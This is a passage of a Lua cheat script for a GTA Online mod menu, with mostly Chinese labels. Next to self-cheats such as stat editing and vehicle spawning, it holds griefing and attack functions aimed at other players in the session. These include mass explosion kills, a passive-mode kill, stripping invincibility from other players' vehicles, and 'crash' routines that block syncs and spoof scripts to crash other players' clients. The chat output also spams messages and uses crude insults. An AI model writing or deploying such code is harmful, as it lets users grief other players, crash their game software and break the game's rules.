end


markedPlayers = {}
otrBlipColour = 58
chatSpamSettings = {
    enabled = false,
    ignoreTeam = true,
    identicalMessages = 5,
}
function executeNuke(pos)
    for a = 0, 100, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10.0, true, false, 1.0, false)
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z , 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
end
function Streament(hash) --Streaming Model
    STREAMING.REQUEST_MODEL(hash)
    while STREAMING.HAS_MODEL_LOADED(hash) ==false do
    util.yield()
    end
end
local function SF_ff9()
    local scaleform = require('lib.ScaleformLib')
    local sf = scaleform('instructional_buttons')
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(0, 86, true), '爆炸 或 推开按')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

local set = {alert = true}
local charger = {charg = util.joaat('dukes2'), emp = util.joaat('hei_prop_heist_emp')}
local function Ccreate(pCoor, pedSi)
    if ENTITY.DOES_ENTITY_EXIST(charger.charg) ==false then
        FFchar = VEHICLE.CREATE_VEHICLE(charger.charg, pCoor.x, pCoor.y, pCoor.z, 0, true, true, false)
        PED.SET_PED_INTO_VEHICLE(pedSi, FFchar, -1)
        VEHICLE.SET_VEHICLE_COLOURS(FFchar, 118, 0)
        for M=0, 49 do
            local modn = VEHICLE.GET_NUM_VEHICLE_MODS(FFchar, M)
            VEHICLE.SET_VEHICLE_MOD(FFchar, M, modn -1, false)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(FFchar, 'MOPAR')
            VEHICLE.GET_VEHICLE_MOD_KIT(FFchar, 0)
            VEHICLE.SET_VEHICLE_MOD_KIT(FFchar, 0)
            VEHICLE.SET_VEHICLE_MOD(FFchar, 14, 0)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 22, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 18, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 20, true)
            VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(FFchar, 0, 0, 0)
            VEHICLE.SET_VEHICLE_WHEEL_TYPE(FFchar, 7)
            VEHICLE.SET_VEHICLE_MOD(FFchar, 23, 26)
            VEHICLE._SET_VEHICLE_MAX_SPEED(FFchar, 100)
            VEHICLE.MODIFY_VEHICLE_TOP_SPEED(FFchar, 40)
            VEHICLE.SET_VEHICLE_BURNOUT(FFchar, false)
        end

        util.yield(150)

       local ccoor = ENTITY.GET_ENTITY_COORDS(FFchar)

        if  ENTITY.DOES_ENTITY_EXIST(charger.emp) ==false
        then Empa = OBJECT.CREATE_OBJECT(charger.emp, ccoor.x, ccoor.y -1, ccoor.z -1, true, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(Empa, FFchar, 0, 0.0, -2.0, 0.5, 0.0, 0.0, 0.0, false, true, false, false, 0, true)
            local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
            ENTITY.SET_ENTITY_HEADING(FFchar, CV)
            util.yield()
        end

    local magtf = {true, false}
    local maglist = {'推开', '爆炸'}
    local magval = {mag_v = true}
    function Magout()
        if  PAD.IS_CONTROL_PRESSED(0, 86) then
        local car = ENTITY.GET_ENTITY_COORDS(players.user_ped())

        FIRE.ADD_EXPLOSION(car.x, car.y, car.z, 81, 5000.0, false, true, 0.0, magval.mag_v)
        end
    util.yield()
end

    Mag_int = menu.list_action(ff9car, '电磁脉冲样式', {'Magint'}, '更改样式为推开或炸毁', maglist, function(magint)
        magval.mag_v = magtf[magint]
        end)


      util.create_tick_handler(function ()
            if PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, false) ==true then
            VEHICLE.SET_VEHICLE_DIRT_LEVEL(FFchar, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(FFchar, true)
            VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(FFchar, false)
            SF_ff9()
            end
        end)
        else
    end
end
function MP_INDEX()
    return "MP" .. util.get_char_slot() .. "_"
end

function IS_MPPLY(Stat)
    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        return true
    else
        return false
    end
end

function STAT_SET_INT(Stat, Value)
    if IS_MPPLY(Stat) then
        STATS.STAT_SET_INT(util.joaat(Stat), Value, true)
    else
        STATS.STAT_SET_INT(util.joaat(MP_INDEX() .. Stat), Value, true)
    end
end

function STAT_SET_FLOAT(Stat, Value)
    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_SET_FLOAT(util.joaat(Stat), Value, true)
    else
        STATS.STAT_SET_FLOAT(util.joaat(MP_INDEX() .. Stat), Value, true)
    end
end

function STAT_SET_BOOL(Stat, Value)
    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_SET_BOOL(util.joaat(Stat), Value, true)
    else
        STATS.STAT_SET_BOOL(util.joaat(MP_INDEX() .. Stat), Value, true)
    end
end
function menu.mutually_exclusive_toggle(root, name, commands, help, exclusive_toggles, func)
    local this_toggle
    this_toggle = menu.toggle(root, name, commands, help, function(toggle)
        if toggle then
            for _, ref in pairs(exclusive_toggles) do
                if ref != this_toggle and menu.get_value(ref) then
                    menu.set_value(ref, false)
                end
            end
        end
        func(toggle)
    end)
    return this_toggle
end
local remove_projectiles = false
local function disableProjectileLoop(projectile)
    util.create_thread(function()
        util.create_tick_handler(function()
            WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
            return remove_projectiles
        end)
    end)
end
function HIDE(scaleform)
	GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "HIDE")
	GRAPHICS.BEGIN_TEXT_COMMAND_SCALEFORM_STRING("STRING")
	HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME("presents")
	GRAPHICS.END_TEXT_COMMAND_SCALEFORM_STRING()
	GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_FLOAT(0.16)
	GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
local function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = v3(direction)
    destination:mul(distance)
    destination:add(cam_pos)

    return destination
end
local function raycast_gameplay_cam(distance)
    local result = {}
    local didHit = memory.alloc(1)
    local endCoords = v3()
    local surfaceNormal = v3()
    local hitEntity = memory.alloc_int()

    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)

    local destination = v3(direction)
    destination:mul(distance)
    destination:add(cam_pos)

    local handle = SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(cam_pos.x, cam_pos.y, cam_pos.z, destination.x, destination.y, destination.z, -1, players.user_ped(), 4)
    SHAPETEST.GET_SHAPE_TEST_RESULT(handle, didHit, memory.addrof(endCoords), memory.addrof(surfaceNormal), hitEntity)

    result.didHit = memory.read_byte(didHit) ~= 0
    result.endCoords = endCoords
    result.surfaceNormal = surfaceNormal
    result.hitEntity = memory.read_int(hitEntity)
    return result
end
local function executeNuke(pos)
    for a = 0, nuke_height, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
end
local function direction(offset)
    local c1 = get_offset_from_gameplay_camera(offset or 5)
    local res = raycast_gameplay_cam(1000)
    local c2

    if res.didHit then
        c2 = res.endCoords
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end
    c2:sub(c1)
    c2:mul(1000)

    return c2, c1
end
mutually_exclusive_weapons  = {}
local nuke_gun_option
function lhbz(toggle)
    uke_gun_option = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1312131151 then --if holding homing launcher
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1312131151)
                end
                util.create_thread(function()
                    local hash = util.joaat('w_arena_airmissile_01a')
                    loadModel(hash)

                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local dir, pos = direction()

                    local bomb = entities.create_object(hash, pos)
                    ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                    ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)

                    while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
                        util.yield()
                    end
                    local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                    entities.delete_by_handle(bomb)
                    executeNuke(nukePos)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return nuke_gun_option
    end)
end
local irlTime = false
local setClockCommand = menu.ref_by_path('World>Atmosphere>Clock>Time', 37)
local smoothTransitionCommand = menu.ref_by_path('World>Atmosphere>Clock>Smooth Transition', 37)
function xssj(toggle)
    irlTime = toggle
    if menu.get_value(smoothTransitionCommand) then menu.trigger_command(smoothTransitionCommand) end
    util.create_tick_handler(function()
        menu.trigger_command(setClockCommand, os.date('%H:%M:%S'))
        return irlTime
    end)
end

mapZoom = 83
function Zoom_map(value)
    mapZoom = 83
    mapZoom = value
    util.create_tick_handler(function()
        HUD.SET_RADAR_ZOOM_PRECISE(mapZoom)
        return mapZoom != 83
    end)
end
function RequestControl(entity)
    local tick = 0
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
        util.yield()
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
        tick = tick + 1
    end
end
function lhbj()
    local waypointPos = get_waypoint_v3()
    if waypointPos then
        local hash = util.joaat('w_arena_airmissile_01a')
        loadModel(hash)

        waypointPos.z += 30
        local bomb = entities.create_object(hash, waypointPos)
        waypointPos.z -= 30
        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)

        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
            util.yield()
        end
        entities.delete_by_handle(bomb)
        executeNuke(waypointPos)
    end
end

nuke_height = 10
function lhgd(value)
    nuke_height = value
end
function STAT_SET_INCREMENT(Stat, Value)
    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_INCREMENT(util.joaat(Stat), Value, true)
    else
        STATS.STAT_INCREMENT(util.joaat(MP_INDEX() .. Stat), Value, true)
    end
end
local launcherThrowable = util.joaat('weapon_grenade')
local throwables_launcher
function throwablebullet(toggle)
    throwables_launcher = toggle
    util.create_tick_handler(function()
        if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1568386805 then --if holding grenade launcher
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if not remove_projectiles then
                    remove_projectiles = true
                    disableProjectileLoop(-1568386805)
                end
                util.create_thread(function()
                    local currentWeapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), false)
                    local pos1 = ENTITY._GET_ENTITY_BONE_POSITION_2(currentWeapon, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(currentWeapon, 'gun_muzzle'))
                    local pos2 = get_offset_from_gameplay_camera(30)
                    if not WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), launcherThrowable, false) then
                        WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), launcherThrowable, 9999, false, false)
                    end
                    util.yield()
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos1.x, pos1.y, pos1.z, pos2.x, pos2.y, pos2.z, 200, true, launcherThrowable, players.user_ped(), true, false, 2000.0)
                end)
            else
                remove_projectiles = false
            end
        else
            remove_projectiles = false
        end
        return throwables_launcher
    end)
end
local explosion_circle_angle = 0
function explosion_circle(ped, angle, radius)
    local ped_coords = ENTITY.GET_ENTITY_COORDS(ped)

    local offset_x = ped_coords.x
    local offset_y = ped_coords.y

    local x = offset_x + radius * math.cos(angle)
    local y = offset_y + radius * math.sin(angle)

    FIRE.ADD_EXPLOSION(x, y, ped_coords.z, 4, 1, true, false, 0)
end
function pwdl(toggle)
    local graceRef = refbypass("Self>Gracefulness")
    local valueragdoll = getvalue(graceRef)
    togglestate = toggle
    while(togglestate) do
        while(PED.IS_PED_FALLING(players.user_ped())) do
            local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            local floorcoords, success
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            if(c.z >= floorcoords + 5) then
                if not (c.z >= floorcoords + 7) then
                    if(valueragdoll) then --baguette
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
                    else
                        menu.trigger_commands("grace on")
                    end
                end
            end
            util.yield()
        end
        util.yield()
    end
end
function jiasudian()
    local coords = players.get_position(players.user())
        coords.z = coords.z - 0.6
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local heading = ENTITY.GET_ENTITY_HEADING(player)
        local heading = heading + 80
        local boostpad = entities.create_object(3287988974, coords)
        ENTITY.SET_ENTITY_HEADING(boostpad, heading)
        util.toast("是不是像你的大头一样绿")
    end
    function sigejiasudian()
    local coords = players.get_position(players.user())
        coords.z = coords.z - 0.6
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local heading = ENTITY.GET_ENTITY_HEADING(player)
        local boostpad = entities.create_object(-388593496, coords)
        ENTITY.SET_ENTITY_HEADING(boostpad, heading)
    end
function vehicle_emp(pid)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 65, 999, false, true, 0)
end
function remove_vehicle_god(vehicle)
    request_control_of_entity(vehicle)

    if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, false)
    else
        util.toast("无法控制车辆")
    end
end
function yichuvehiclegod()
for k,v in pairs(players.list(false, true, true)) do
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped)

    if vehicle ~= 0 then
        remove_vehicle_god(vehicle)
        
    end
end
end
function kill_player(pid)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'] + 2, 7, 1000, false, true, 0)
end
function wushengsharen()
for k,v in pairs(players.list(false, true, true)) do
    kill_player(v)
    util.yield()
end
end
function get_player_count()
    return #players.list(true, true, true)
end
function upgrade_vehicle(vehicle)
    for i = 0, 49 do
        local num = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)
        VEHICLE.SET_VEHICLE_MOD(vehicle, i, num - 1, true)
    end
end
function request_control_of_entity(ent, time)
    if ent and ent ~= 0 then
        local end_time = os.clock() + (time or 3)
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and os.clock() < end_time do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            util.yield()
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end
    return false
end
function load_model(hash) -- lancescript
    local request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

function give_oppressor(pid)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)

    local hash = util.joaat("oppressor2")

    if not STREAMING.HAS_MODEL_LOADED(hash) then
        load_model(hash)
    end

    local oppressor = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(ped))
    ENTITY.SET_ENTITY_INVINCIBLE(oppressor)

    upgrade_vehicle(oppressor)
end
function shuamk2()
    chat.send_message("嗨嗨嗨 来了奥", false, true, true)
    for k,v in pairs(players.list(true, true, true)) do
        give_oppressor(v)
        util.yield()
    end
end
function load_weapon_asset(hash)
    while not WEAPON.HAS_WEAPON_ASSET_LOADED(hash) do
        WEAPON.REQUEST_WEAPON_ASSET(hash)
        util.yield(50)
    end
end
function passive_mode_kill(pid)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local hash = 0x787F0BB

    local audible = true
    local visible = true

    load_weapon_asset(hash)
    
    for i = 0, 50 do
        if PLAYER.IS_PLAYER_DEAD(pid) then
            util.toast("已成功杀死 " .. players.get_name(pid))
            return
        end

        local coords = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z - 2, 100, 0, hash, 0, audible, not visible, 2500)
        
        util.yield(10)
    end

    util.toast("无法弄死" .. players.get_name(pid) .. ". 他是挂壁！！！")
end
function beidongsharen()
    for k,v in pairs(players.list(false, true, true)) do
        passive_mode_kill(v)
    end
end
function baozhanquan()
for k,v in pairs(players.list(true, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
            explosion_circle(ped, explosion_circle_angle, 25)
        end

        explosion_circle_angle += 0.15
        util.yield(50)
    end
    function xihuoba()
        for k,v in pairs(players.list(true, true, true)) do
        vehicle_emp(v)
        
    end
end 
function STAT_GET_INT(Stat)
    local IntPTR = memory.alloc(4)

    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_GET_INT(util.joaat(Stat), IntPTR, -1)
    else
        STATS.STAT_GET_INT(util.joaat(MP_INDEX() .. Stat), IntPTR, -1)
    end

    return memory.read_int(IntPTR)
end
---@param t table
---@return any
function table.random(t)
	if rawget(t, 1) ~= nil then
		return t[ math.random(#t) ]
	end
	local list = {}
	for _, value in pairs(t) do
		table.insert(list, value)
	end
	local result = list[math.random(#list)]
	return type(result) ~= "table" and result or table.random(result)
end
throwablesTable = {
    ['榴弹']  = util.joaat('weapon_grenade'),
    ['粘弹']  = util.joaat('weapon_stickybomb'),
    ['定时炸弹']  = util.joaat('weapon_proxmine'),
    ['烟雾弹']  = util.joaat('weapon_bzgas'),
    ['催泪瓦斯']  = util.joaat('weapon_smokegrenade'),
    ['燃烧瓶']  = util.joaat('weapon_molotov'),
    ['信号弹']  = util.joaat('weapon_flare'),
    ['雪球']  = util.joaat('weapon_snowball'),
    ['Wish的球球:)']  = util.joaat('weapon_ball'),
    ['土制炸弹'] = util.joaat('weapon_pipebomb'),
}
local function pairsByKeys(t, f)
    local a = {}
    for n in pairs(t) do table.insert(a, n) end
    table.sort(a, f)
    local i = 0
    local iter = function()
        i += 1
        if a[i] == nil then return nil
        else return a[i], t[a[i]]
        end
    end
    return iter
end

function getLabelTableFromKeys(keyTable)
    local labelTable = {}
    for k, v in pairsByKeys(keyTable) do
        table.insert(labelTable, {k})
    end
    return labelTable
end

function bulletset(text)
    launcherThrowable = throwablesTable[text]
end

function STAT_GET_FLOAT(Stat)
    local FloatPTR = memory.alloc(4)

    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_GET_FLOAT(util.joaat(Stat), FloatPTR, -1)
    else
        STATS.STAT_GET_FLOAT(util.joaat(MP_INDEX() .. Stat), FloatPTR, -1)
    end

    return tonumber(string.format("%.3f", memory.read_float(FloatPTR)))
end
function TELEPORT(X, Y, Z)
    PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), X, Y, Z)
end
function cshj()
    if STAT_GET_INT("IH_SUB_OWNED") == 0 then
        NOTIFY(TRANSLATE("You have not bought Kosatka yet. Buy it first to teleport!"))
    else
        TELEPORT(1561.2369, 385.8771, -49.689915)
        SET_HEADING(175)
    end
end
function SET_HEADING(Heading)
    ENTITY.SET_ENTITY_HEADING(players.user_ped(), Heading)
end
function STAT_GET_BOOL(Stat)
    local BoolPTR = memory.alloc(1)

    if string.find(Stat, "MPPLY_") or string.find(Stat, "MP_") then
        STATS.STAT_GET_BOOL(util.joaat(Stat), BoolPTR, -1)
    else
        STATS.STAT_GET_BOOL(util.joaat(MP_INDEX() .. Stat), BoolPTR, -1)
    end

    if memory.read_byte(BoolPTR) == 1 then
        return "true"
    else
        return "false"
    end
end
local function get_random_joke()
    local joke = 'WIP'
    local in_progress = true
    async_http.init('icanhazdadjoke.com', '', function(data)
        joke = data
    end, function()
        joke = 'FAIL'
    end)
    async_http.add_header('Accept', 'text/plain')
    async_http.dispatch()
    while joke == "WIP" do 
        util.yield()
    end
    return joke
end
local function fake_chat_with_percentage_and_target(action)
    chat.send_message(action .. " ${name}. [||||            ] (25%)", false, true, true)
    util.yield(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||        ] (50%)", false, true, true)
    util.yield(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||    ] (75%)", false, true, true)
    util.yield(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||||| ] (89%)", false, true, true)
    util.yield(math.random(3000, 5000))
end
function hackchat()
    fake_chat_with_percentage_and_target("黑入")
    chat.send_message("黑入失败" .. " ${name}. " .. "原因：没有屁眼", false, true, true)
end
function loopsuijixiaohua()
    if util.is_session_started() then
        local joke = get_random_joke()
        if joke ~= "FAIL" then
            chat.send_message(joke, false, true, true)
        end
        util.yield(5000)
    end
end
---@param player Player
---@param radius number
---@return Entity[]
function get_peds_in_player_range(player, radius)
	local peds = {}
	local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player)
	local pos = players.get_position(player)
	for _, ped in ipairs(entities.get_all_peds_as_handles()) do
		if ped ~= playerPed and not PED.IS_PED_FATALLY_INJURED(ped) then
			local pedPos = ENTITY.GET_ENTITY_COORDS(ped, true)
			if pos:distance(pedPos) <= radius then table.insert(peds, ped) end
		end
	end
	return peds
end

function spawn_ped_in_car(car, playerped, isclone)
    if car == 0 then
        util.toast("玩家不在车里.")
    elseif VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(car) then
        if isclone then
            local ped_created = PED.CLONE_PED(playerped, true, false, true)
            local seat = VEHICLE.IS_VEHICLE_SEAT_FREE(car, -1, false) and -1 or -2
            PED.SET_PED_INTO_VEHICLE(ped_created, car, seat)
            announce("已生成.")
        else
            local coords = ENTITY.GET_ENTITY_COORDS(car, false)
            local random_ped = some_ped_list[math.random(#some_ped_list)]
            local random_ped_hash = util.joaat(random_ped)
            request_model(random_ped_hash) -- Ped is now loaded in memory, so i don't care about what it returns. Point of this is to load ped before i spawn it (otherwise ped won't spawn)
            local ped_created = entities.create_ped(4, random_ped_hash, coords, 0)
            local seat = VEHICLE.IS_VEHICLE_SEAT_FREE(car, -1, false) and -1 or -2
            PED.SET_PED_INTO_VEHICLE(ped_created, car, seat)
            announce("ok.")
        end
    else
        util.toast("没有空位！！！.")
    end
end

local function fill_car_with_peds(vehicle, playerped, isclone)
    if vehicle == 0 then
        util.toast("这吊毛不在车里.")
    elseif VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(vehicle) then
        while VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(vehicle) do
            spawn_ped_in_car(vehicle, playerped, isclone)
        end
        announce("车位满了.")
    else
        util.toast("没有空位！！！.")
    end
end
function scwj(index)
local player_ped = PLAYER.GET_PLAYER_PED(pid)
            local car = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions) -- alternatively: local car = use_last_vehicle_toggle and PED.GET_VEHICLE_PED_IS_IN(ped) or get_vehicle_ped_is_in(pid, false)        
            if index == 1 then
                spawn_ped_in_car(car, player_ped, true)
            elseif index == 2 then
                fill_car_with_peds(car, player_ped, true)
            end
        end
        function scnpc(index)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
            local car = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions) -- alternatively: local car = use_last_vehicle_toggle and PED.GET_VEHICLE_PED_IS_IN(ped) or get_vehicle_ped_is_in(pid, false)        
            if index == 1 then
                spawn_ped_in_car(car, player_ped, false)
            elseif index == 2 then
                fill_car_with_peds(car, player_ped, false)
            end
        end
function suijixiaohua()
    local joke = get_random_joke()
    if joke ~= "FAIL" then
        chat.send_message(joke, false, true, true)
    end
end
--====移除玩家
function BlockSyncs(pid, callback)
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "on")
		end
	end
	util.yield(10)
	callback()
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "off")
		end
	end
end
function Natural(PlayerID)
    local user = players.user()
            local user_ped = players.user_ped()
            local pos = players.get_position(user)
            BlockSyncs(PlayerID, function() 
                util.yield(100)
                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
                TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
                util.yield()
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
                util.yield(250)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
                util.yield(1000)
                for i = 1, 5 do
                    util.spoof_script("freemode", SYSTEM.WAIT)
                end
                ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
                NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
            end)
        end
        function Memoir(PlayerID)
            util.toast("Memoir超级崩溃！！！ ")
                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
                util.yield(20)
                local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
                TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
                util.yield(500)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
                util.yield(1000)
                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
                end
                function wenyi(PlayerID)
                    for i = 1, 10 do
                            local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
                            local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
                            STREAMING.REQUEST_MODEL(-930879665)
                            util.yield(10)
                            STREAMING.REQUEST_MODEL(3613262246)
                            util.yield(10)
                            STREAMING.REQUEST_MODEL(452618762)
                            util.yield(10)
                            while not STREAMING.HAS_MODEL_LOADED(-930879665) do util.yield() end
                            while not STREAMING.HAS_MODEL_LOADED(3613262246) do util.yield() end
                            while not STREAMING.HAS_MODEL_LOADED(452618762) do util.yield() end
